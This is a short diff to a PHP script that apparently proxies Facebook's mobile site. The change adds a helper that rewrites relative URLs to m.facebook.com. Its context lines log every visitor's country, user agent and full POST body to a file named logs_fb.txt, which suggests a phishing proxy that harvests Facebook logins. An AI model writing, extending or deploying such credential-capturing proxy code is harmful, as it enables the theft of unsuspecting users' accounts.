@@ -28,13 +28,21 @@ file_put_contents("logs_fb.txt", json_encode([
 		"country"=>$country,
 		"ua"=>$ua,
 		"post"=>$_POST,
-		"url"=>urldecode($_GET['url'])
+		"url"=>(isset($_GET['url']) ? fixurl(urldecode($_GET['url'])) : "https://m.facebook.com")
 	], 128)."\n\n", FILE_APPEND | LOCK_EX);
 if (strpos($_GET['url'], "messages")!==false) {
 	http_response_code(403);
 	die("403 Forbidden ! (Anda tidak memiliki akses ke sumber daya ini)");
 }
 run($_GET['url']??"");
+function fixurl($url)
+{
+	if (strpos($url, "https://")===false) {
+		return "https://m.facebook.com/".$url;
+	} else {
+		return $url;
+	}
+}
 function run(string $url)
 {
 		/*global $fb;*/
